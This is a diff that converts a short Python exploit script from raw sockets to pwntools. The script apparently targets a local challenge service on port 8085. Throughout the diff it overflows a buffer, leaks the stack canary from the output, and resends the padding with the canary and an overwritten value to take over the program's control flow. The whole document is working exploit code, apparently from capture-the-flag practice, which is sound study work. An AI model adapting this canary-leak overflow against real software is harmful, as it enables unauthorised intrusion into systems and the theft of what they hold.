@@ -1,22 +1,20 @@
-import socket
+from pwn import *
+import sys
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1',8085))
-
-s.recv(1024)
+s = remote('127.0.0.1',8085)
+s.recvuntil('>')
 s.send('m\n')
-s.recv(1024)
+s.recvline()
 s.send('a'*24 + '\n')
-s.recv(1024)
-s.recv(1024)
+s.recvuntil('>')
 s.send('d\n')
-res = s.recv(1024)
-canary = res.split('\n')[2][-4:]
+res = s.recvlines(3)
+canary = res[2][-4:]
+s.recvuntil('>')
 s.send('m\n')
-s.recv(1024)
+s.recvline()
 s.send('a'*24 + canary + '\x01\x00\x00\x00\n')
-s.recv(1024)
-s.recv(1024)
+s.recvuntil('>')
 s.send('f\n')
-print(s.recv(1024))
-print(s.recv(1024))
+print s.recvuntil('>')
+s.close()
